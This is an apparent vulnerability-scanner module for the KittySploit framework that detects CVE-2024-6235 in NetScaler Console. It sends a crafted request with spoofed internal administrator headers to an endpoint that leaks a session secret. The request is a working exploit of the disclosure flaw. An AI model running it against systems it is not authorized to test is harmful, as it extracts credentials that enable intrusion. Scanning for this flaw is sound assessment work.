#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sensitive information disclosure in NetScaler Console."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NetScaler Console - Sensitive Information Disclosure Detection',
        'description': 'Sensitive information disclosure in NetScaler Console',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'netscaler', 'exposure', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://support.citrix.com/article/CTX677998',
            'https://attackerkb.com/topics/7zebEgmGLs/cve-2024-6235',
            'https://nvd.nist.gov/vuln/detail/cve-2024-6235',
        ],
        'cve': 'CVE-2024-6235',
    }

    def run(self):
        path = '/internal/v2/config/mps_secret/ADM_SESSIONID'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Referer': '{{RootURL}}/admin_ui/mas/ent/html/main.html', 'Content-Type': 'application/json', 'If-Modified-Since': 'Thu, 01 Jan 1970 05:30:00 GMT', 'NITRO_WEB_APPLICATION': 'true', 'Tenant-Name': 'Owner', 'User-Name': 'nsroot', 'Mps-Internal-Request': 'true'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"mps_secret":', 'ADM_SESSIONID',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='NetScaler Console - Sensitive Information Disclosure detected', path=path)
            return True
        return False

